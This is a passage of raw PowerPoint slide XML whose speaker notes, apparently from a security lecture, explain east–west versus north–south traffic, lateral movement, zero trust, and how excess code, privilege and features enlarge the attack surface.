        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Typical path (simplified):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web Tier → App Tier → DB Tier</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> or</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Container on Host A → Container on Host B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Characteristics:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stays </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inside</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> the data center or internal network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Often </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>much higher volume</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> than north–south (especially with microservices)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Historically less inspected, now a focus for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>micro segmentation / zero trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>leaf–spine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> or similar DC fabrics optimized for lateral traffic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B22AA8FB-8FAB-BE02-B79D-A0FCBFA292B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>89</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41141313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FB2A0-EEF1-3329-B531-F31C4DC42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312D5-C678-0369-79BA-9E54B26FC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27C8B-FEF0-CF6A-5F7A-3B54F49C9646}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Historically, we focused on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>north–south</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Secure the perimeter, put a big firewall at the front, maybe a load balancer, job done.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>This is now a legacy defense model</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>With microservices and serverless, the scary truth is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The majority of traffic is now east–west</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: service A calls B, B calls C, C calls a database, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Once an attacker gets past the “front door” (or compromises one internal service), they can try to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>move laterally</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> through all those internal calls.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>North–South:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Easier to monitor at a few choke points.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C410D505-7666-1156-4EEA-F1DEF28B8887}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>90</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38330044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294F4-B174-4D1B-13A7-96CB8CFF6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D3849-1353-CD4A-4E4E-C7FE4EC7B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CD3D0-1EF3-67EB-8D7C-DDF0882C9A36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If any service can call it, or you have weak network boundaries, that becomes a high-impact data exfiltration vector. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37237E65-F011-EEC3-4D67-EFAADD7BADF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>91</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35224925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ABBC-F378-4936-9667-6BCAD0ACA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BC18F-D156-4741-51C2-92C9391C1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18FA86-97E6-8FAC-296D-5DC007F2776E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If any service can call it, or you have weak network boundaries, that becomes a high-impact data exfiltration vector. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{616D76CD-DC76-F945-21A4-BAF230362354}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>92</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20942263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6459E-D268-E788-25C0-409386021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A5129-87DA-4D9E-01BE-276C3B664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E93CF-231E-C844-CCDB-77DD3A4C28A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If any service can call it, or you have weak network boundaries, that becomes a high-impact data exfiltration vector. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F830FC2F-48D7-C971-AEA4-09E485D1E264}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>93</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="372004059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B1132-13B0-EE27-BA20-836DB23BC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AD692-9655-F607-A6FA-79EFA8D59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AF5BD-CCF8-B176-9AC1-3747B6E31C13}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>One of the strongest defenses for East-West traffic security concerns is a 'Zero Trust' Security posture.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D5320C7-39A6-739D-7D1D-27BE8548A6FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>94</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27030334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AC48A-A017-1622-929F-C6DF9F206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38291-D0E3-49FC-E82A-9B35DF4F0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DDAFB-E60E-C2A7-1C83-CB7B6912CB06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Too Much” is the Enemy of Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Too Much” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>can be found in:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Features</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ideas</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5FE2BAC-0762-3A55-37EB-6C647B3A78A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>95</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="333143878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C60A4-5C1A-D088-A001-EC5BA9502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BBAEC-537C-AACC-CCDD-77A7E7D46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E2361-B348-B129-8807-54A2B30337EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Excess code expands the attack surface: unused endpoints, legacy functions, and overly complex logic can introduce bugs, privilege escalation paths, and remote code execution opportunities that nobody is even watching.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Privilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Excess privilege means accounts, services, and processes can do more than they need to, so a single compromise can fan out into full-environment access instead of being contained to a small, low-impact blast radius.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Features</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Excess features add configuration, states, and integrations that often go half-documented and lightly tested, creating obscure edge cases and misconfigurations that attackers are highly motivated to find before you do.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ideas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> – Excess ideas can scatter focus and resources across too many “cool” projects, pilots, and exceptions, leaving core security controls underfunded, understaffed, or only half-implemented—and attackers go after the gaps you didn’t have time to close.</a:t>
            </a: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36A6B178-B811-DC6B-0EEA-FC8B880BE109}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>96</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="375899752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1492-9098-1246-3C37-C149DA044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54AFC-370D-0406-94B0-702E72239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73540-92D3-FB76-FE27-4FA48AB14FC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07D0FE65-956A-2961-7F31-DEF3FDF8EB77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
